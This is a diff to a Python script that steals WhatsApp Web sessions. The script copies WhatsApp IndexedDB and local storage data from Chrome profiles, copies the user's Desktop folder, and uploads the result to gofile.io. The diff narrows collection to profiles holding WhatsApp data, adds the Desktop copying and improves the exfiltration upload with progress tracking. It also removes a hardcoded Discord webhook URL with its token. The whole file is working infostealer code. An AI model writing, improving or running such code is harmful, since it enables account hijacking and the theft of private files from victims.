@@ -11,6 +11,12 @@ from pathlib import Path
 import requests
 
 try:
+    from requests_toolbelt.multipart.encoder import MultipartEncoder, MultipartEncoderMonitor
+except Exception:
+    MultipartEncoder = None
+    MultipartEncoderMonitor = None
+
+try:
     import dhooks
 except Exception as _e:
     dhooks = None
@@ -20,7 +26,7 @@ else:
 
 # PSG > OM
 
-WEBHOOK = "https://discord.com/api/webhooks/1553035523835035731/0RpTshpc0RiUfuKV2IDP3YH8gptecvencCaKFYOVV6N-eW_kRWW5fd5aR-yq_vF0i-YT"
+WEBHOOK = "Rins on top"
 
 AVATAR = ("https://github.com/rinsfx/WhatsappMaster/blob/master/"
           "assets/whatsapp.png?raw=true")
@@ -51,12 +57,13 @@ CHROME_ROOTS = {
 }
 
 WA_SUBPATHS = [
-    Path("IndexedDB") / "https.web.whatsapp.com_0.indexeddb.leveldb",
     Path("IndexedDB") / "https_web.whatsapp.com_0.indexeddb.leveldb",
     Path("Local Storage") / "leveldb",
     Path("Session Storage"),
     Path("Preferences"),
 ]
+
+WA_MARKER = Path("IndexedDB") / "https_web.whatsapp.com_0.indexeddb.leveldb"
 
 SKIP_PROFILES = {"Guest Profile", "System Profile"}
 
@@ -112,6 +119,38 @@ def copy_tree_robust(src: Path, dst: Path):
     return copied, skipped
 
 
+def _copy_file(src: Path, dst: Path):
+    try:
+        dst.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copy2(src, dst)
+        return True, None
+    except Exception as e:
+        return False, str(e)
+
+
+def collect_desktop(stage: Path, manifest: dict):
+    log(f"desktop target check: {DESKTOP_DIR} exists={DESKTOP_DIR.exists()}")
+    if not DESKTOP_DIR.exists():
+        manifest["targets"].append({"type": "desktop", "status": "skipped",
+                                     "reason": "path not found",
+                                     "path": str(DESKTOP_DIR)})
+        return
+    dst = stage / "desktop"
+    copied, skipped = copy_tree_robust(DESKTOP_DIR, dst)
+    entry = {"type": "desktop", "path": str(DESKTOP_DIR)}
+    if copied > 0:
+        entry["status"] = "ok"
+        entry["files_copied"] = copied
+        if skipped:
+            entry["warnings"] = skipped[:20]
+        log(f"desktop collected ok, files={copied}, skipped={len(skipped)}")
+    else:
+        entry["status"] = "skipped"
+        entry["reason"] = "no files copied"
+        log("desktop skipped: no files")
+    manifest["targets"].append(entry)
+
+
 def collect_chrome(stage: Path, manifest: dict, browsers: list):
     for bname in browsers:
         root = CHROME_ROOTS.get(bname)
@@ -125,6 +164,11 @@ def collect_chrome(stage: Path, manifest: dict, browsers: list):
             if profile.name in SKIP_PROFILES:
                 continue
             if profile.name != "Default" and not profile.name.startswith("Profile "):
+                continue
+
+            wa_marker = profile / WA_MARKER
+            if not wa_marker.exists():
+                log(f"chrome {bname}/{profile.name}: no whatsapp data, skipping")
                 continue
 
             entry = {"type": "chrome", "browser": bname, "profile": profile.name}
@@ -155,7 +199,7 @@ def collect_chrome(stage: Path, manifest: dict, browsers: list):
                 entry["status"] = "ok"
                 entry["files_copied"] = total_copied
                 if total_skipped:
-                    entry["warnings"] = total_skipped[:20]  # cap biar manifest nggak blow up
+                    entry["warnings"] = total_skipped[:20]
             else:
                 entry["status"] = "skipped"
                 entry["reason"] = "no files copied"
@@ -163,56 +207,44 @@ def collect_chrome(stage: Path, manifest: dict, browsers: list):
             manifest["targets"].append(entry)
 
 
-def collect_desktop(stage: Path, manifest: dict):
-    log(f"desktop target check: {DESKTOP_DIR} exists={DESKTOP_DIR.exists()}")
-    if not DESKTOP_DIR.exists():
-        manifest["targets"].append({"type": "desktop", "status": "skipped",
-                                     "reason": "path not found",
-                                     "path": str(DESKTOP_DIR)})
-        return
-    dst = stage / "desktop"
-    ok, err = copytree_safe(DESKTOP_DIR, dst)
-    entry = {"type": "desktop", "path": str(DESKTOP_DIR)}
-    if ok:
-        entry["status"] = "ok"
-        log("desktop collected ok")
-    else:
-        entry["status"] = "skipped"
-        entry["reason"] = err
-        log(f"desktop skipped: {err}")
-        if dst.exists():
-            shutil.rmtree(dst, ignore_errors=True)
-    manifest["targets"].append(entry)
-
-def _copy_file(src: Path, dst: Path):
-    try:
-        dst.parent.mkdir(parents=True, exist_ok=True)
-        shutil.copy2(src, dst)
-        return True, None
-    except Exception as e:
-        return False, str(e)
-
-
 def upload_to_gofile(path: Path, retries: int, delay: int):
     log(f"upload start: {path} size={path.stat().st_size if path.exists() else 'MISSING'}")
     for i in range(retries):
         try:
-            # gofile API v2: /servers (plural), returns data.servers[]
             r = requests.get("https://api.gofile.io/servers", timeout=15)
-            log(f"servers status={r.status_code} body={r.text[:200]}")
             servers = r.json()["data"]["servers"]
-            if not servers:
-                raise RuntimeError("no servers returned")
-            server = servers[0]["name"]
-            log(f"gofile server: {server} (attempt {i+1})")
+            preferred = next((s for s in servers if s["zone"] == "na"), servers[0])
+            server = preferred["name"]
+            log(f"gofile server: {server} zone={preferred['zone']} (attempt {i+1})")
 
-            with open(path, "rb") as fh:
-                up = requests.post(
-                    f"https://{server}.gofile.io/contents/uploadfile",
-                    files={"file": fh},
-                    timeout=300
-                )
-            log(f"upload status={up.status_code} body={up.text[:300]}")
+            size = path.stat().st_size
+            last_logged = [0]
+
+            if MultipartEncoder and MultipartEncoderMonitor:
+                def on_progress(monitor):
+                    pct = int(monitor.bytes_read / size * 100)
+                    if pct - last_logged[0] >= 10:
+                        log(f"  upload {pct}% ({monitor.bytes_read}/{size})")
+                        last_logged[0] = pct
+
+                with open(path, "rb") as fh:
+                    enc = MultipartEncoder(fields={"file": (path.name, fh)})
+                    monitor = MultipartEncoderMonitor(enc, on_progress)
+                    up = requests.post(
+                        f"https://{server}.gofile.io/contents/uploadfile",
+                        data=monitor,
+                        headers={"Content-Type": monitor.content_type},
+                        timeout=(15, 600)
+                    )
+            else:
+                with open(path, "rb") as fh:
+                    up = requests.post(
+                        f"https://{server}.gofile.io/contents/uploadfile",
+                        files={"file": fh},
+                        timeout=(15, 600)
+                    )
+
+            log(f"upload status={up.status_code} body={up.text[:500]}")
             data = up.json()
             if data.get("status") != "ok":
                 raise RuntimeError(f"gofile rejected: {data}")
